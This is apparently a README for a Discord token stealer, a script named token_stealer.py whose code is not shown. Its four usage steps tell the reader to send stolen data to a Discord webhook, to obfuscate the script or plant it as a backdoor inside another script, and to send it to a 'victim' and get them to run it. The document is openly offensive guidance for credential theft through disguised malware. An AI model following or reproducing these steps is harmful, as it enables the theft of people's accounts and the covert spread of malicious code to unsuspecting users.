# How to use
 1. Create a webhook on your Discord server. I recommend you to create a new server.
 2. Change the 'WEBHOOK_URL' variable value to your Discord webhook URL in [token_stealer.py](token_stealer.py)
 3. *(obfuscate the code or install it as a backdoor in an other script.)*
 4. Send the script to your victim and make them run it.
